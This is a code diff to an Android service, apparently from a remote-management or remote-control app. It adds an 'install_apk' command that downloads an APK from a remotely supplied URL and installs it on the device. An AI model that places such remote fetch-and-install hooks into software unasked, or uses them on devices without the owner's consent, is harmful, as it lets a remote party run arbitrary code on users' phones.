@@ -332,6 +332,13 @@ public class ScreenService extends Service {
                     ack(cmd, true, null);
                     break;
                 }
+                case "install_apk": {
+                    String url = o.optString("url", "");
+                    if (url.isEmpty()) { ack(cmd, false, "missing_url"); break; }
+                    InstallHelper.downloadAndInstall(getApplicationContext(), url);
+                    // InstallHelper fires its own ack once download+launch resolves.
+                    break;
+                }
                 case "policy": {
                     Policy p = Policy.get(this);
                     p.replaceAll(o);
